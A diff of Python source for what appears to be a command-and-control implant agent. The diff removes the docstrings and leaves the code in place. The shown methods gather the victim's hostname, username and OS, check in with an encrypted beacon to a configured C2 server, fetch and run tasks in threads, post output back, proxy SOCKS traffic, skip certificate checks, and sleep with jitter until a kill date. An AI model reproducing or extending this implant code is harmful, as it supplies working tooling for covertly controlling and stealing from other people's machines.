@@ -21,38 +21,25 @@ CHUNK_SIZE = 51200
 
 CRYPTO_MODULE_PLACEHOLDER
 
-    """
-    Determines and returns the operating system version.
-    It prioritizes returning macOS version if available, otherwise returns the general system name and release.
-    """
+
     def getOSVersion(self):
         if platform.mac_ver()[0]: return "macOS "+platform.mac_ver()[0]
         else: return platform.system() + " " + platform.release()
 
-        """
-        Attempts to retrieve the current username.
-        It first tries using the getpass module, then iterates through common environment variables for username information.
-        """
+
     def getUsername(self):
         try: return getpass.getuser()
         except: pass
         for k in [ "USER", "LOGNAME", "USERNAME" ]: 
             if k in os.environ.keys(): return os.environ[k]
             
-        """
-        Formats a message by encoding it with base64 after prepending the agent's UUID and encrypting the JSON representation of the data.
-        Optionally uses URL-safe base64 encoding.
-        """
+   
     def formatMessage(self, data, urlsafe=False):
         output = base64.b64encode(self.agent_config["UUID"].encode() + self.encrypt(json.dumps(data).encode()))
         if urlsafe: 
             output = base64.urlsafe_b64encode(self.agent_config["UUID"].encode() + self.encrypt(json.dumps(data).encode()))
         return output
 
-        """
-        Removes the agent's UUID from the beginning of the received data and then loads it as a JSON object.
-        This function assumes the server's response is prefixed with the agent's UUID.
-        """
     def formatResponse(self, data):
         try:
             if not data:
@@ -77,34 +64,21 @@ CRYPTO_MODULE_PLACEHOLDER
         except json.JSONDecodeError as e:
             return {}
 
-        """
-        Formats a message, sends it to the server using a POST request, decrypts the response, and then formats it as a JSON object.
-        This is a convenience function for sending data and receiving a structured response.
-        """
+ 
     def postMessageAndRetrieveResponse(self, data):
         return self.formatResponse(self.decrypt(self.makeRequest(self.formatMessage(data),'POST')))
 
-        """
-        Formats a message using URL-safe base64, sends it to the server using a GET request, decrypts the response, and then formats it as a JSON object.
-        URL-safe base64 is often used for GET requests to avoid issues with special characters in URLs.
-        """
+
     def getMessageAndRetrieveResponse(self, data):
         return self.formatResponse(self.decrypt(self.makeRequest(self.formatMessage(data, True))))
 
-        """
-        Constructs a message to update the server with the output of a specific task.
-        This message indicates that the task is not yet completed.
-        """
+ 
     def sendTaskOutputUpdate(self, task_id, output):
         responses = [{ "task_id": task_id, "user_output": output, "completed": False }]
         message = { "action": "post_response", "responses": responses }
         response_data = self.postMessageAndRetrieveResponse(message)
 
-        """
-        Gathers completed task responses and any queued socks connections to send to the server.
-        It iterates through the completed tasks, formats their output, and then constructs a message to send.
-        Successful tasks are removed from the internal task list.
-        """
+   
     def postResponses(self):
         try:
             responses = []
@@ -129,10 +103,7 @@ CRYPTO_MODULE_PLACEHOLDER
                     self.taskings.pop(self.taskings.index(task_index))
         except: pass
 
-        """
-        Executes a given task by calling the corresponding function within the agent.
-        It handles parameter parsing, function execution, error handling, and updates the task status.
-        """
+    
     def processTask(self, task):
         try:
             task["started"] = True
@@ -157,10 +128,7 @@ CRYPTO_MODULE_PLACEHOLDER
             task["completed"] = True
             task["result"] = error
 
-        """
-        Iterates through the received tasks and creates a new thread for each unstarted task to execute it concurrently.
-        This allows the agent to handle multiple tasks simultaneously.
-        """
+
     def processTaskings(self):
         threads = list()       
         taskings = self.taskings     
@@ -170,10 +138,6 @@ CRYPTO_MODULE_PLACEHOLDER
                 threads.append(x)
                 x.start()
 
-        """
-        Requests new tasks from the server.
-        It sends a GET request with information about the desired tasking size and processes the received tasks and any new socks connection information.
-        """
     def getTaskings(self):
         data = { "action": "get_tasking", "tasking_size": -1 }
         tasking_data = self.getMessageAndRetrieveResponse(data)
@@ -192,11 +156,7 @@ CRYPTO_MODULE_PLACEHOLDER
         if "socks" in tasking_data:
             for packet in tasking_data["socks"]: self.socks_in.put(packet)
 
-        """
-        Initializes the agent by sending a check-in request to the server.
-        It gathers system information and the initial payload UUID, encrypts it, and sends it to the server.
-        Upon successful check-in, it receives and stores the agent's unique UUID.
-        """
+    
     def checkIn(self):
         hostname = socket.gethostname()
         ip = ''
@@ -233,11 +193,7 @@ CRYPTO_MODULE_PLACEHOLDER
         except json.JSONDecodeError as e:
             return False
 
-        """
-        Makes an HTTP or HTTPS request to the command and control server.
-        It handles both GET and POST requests, includes custom headers, and manages proxy configurations if provided.
-        It also skips SSL certificate verification.
-        """
+     
     def makeRequest(self, data, method='GET', max_retries=5, retry_delay=5):
         hdrs = self.agent_config["Headers"]
         url = f"{self.agent_config['Server']}{self.agent_config['PostURI'] if method == 'POST' else self.agent_config['GetURI'] + '?' + self.agent_config['GetParam'] + '=' + data.decode()}"
@@ -264,20 +220,14 @@ CRYPTO_MODULE_PLACEHOLDER
         
         return ""
 
-        """
-        Checks if the current date has passed the configured kill date for the agent.
-        If the current date is on or after the kill date, it returns True.
-        """
+      
     def passedKilldate(self):
         kd_list = [ int(x) for x in self.agent_config["KillDate"].split("-")]
         kd = datetime(kd_list[0], kd_list[1], kd_list[2])
         if datetime.now() >= kd: return True
         else: return False
 
-        """
-        Pauses the agent's execution for a duration determined by the configured sleep interval and jitter.
-        It calculates a random jitter value within the specified percentage and adds it to the base sleep time.
-        """
+    
     def agentSleep(self):
         j = 0
         if int(self.agent_config["Jitter"]) > 0:
@@ -288,11 +238,7 @@ CRYPTO_MODULE_PLACEHOLDER
 
 #COMMANDS_PLACEHOLDER
 
-    """
-    Initializes the agent object.
-    It sets up queues for socks connections, a list to track tasks, a cache for metadata, and the agent's configuration loaded from predefined variables.
-    It then enters the main loop for agent operation, handling check-in, tasking, and response posting.
-    """
+
     def __init__(self):
         self.socks_open = {}
         self.socks_in = queue.Queue()
